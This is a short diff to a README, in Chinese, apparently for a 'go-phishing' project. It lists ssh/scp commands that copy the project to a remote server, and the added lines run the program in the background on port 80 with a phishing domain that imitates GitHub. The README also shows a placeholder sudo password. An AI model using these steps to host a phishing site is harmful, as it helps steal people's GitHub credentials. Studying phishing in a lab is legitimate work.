@@ -42,7 +42,11 @@ ssh shun@35.229.159.117 -i ~/.ssh/id_rsa
 scp -i ~/.ssh/id_rsa -r . shun@35.229.159.117:~/go-phishing
 scp -i ~/.ssh/id_rsa -r ~/Documents/implement/go-phishing-project shun@35.229.159.117:~/go-phishing
 ```
-
+### 永久執行程式
+> 需要 `sudo` 是因為監聽在 port 80 需要權限，`nohup` 跟結尾的 `&` 則是讓你的程式跑在背景，這樣即便你離開了遠端機器，程式還是會在那邊一直跑
+```
+sudo nohup ./go-phishing --phishURL=https://phish-github.com --port=:80 &
+```
 ### 暫定sudo密碼
 ```
 test
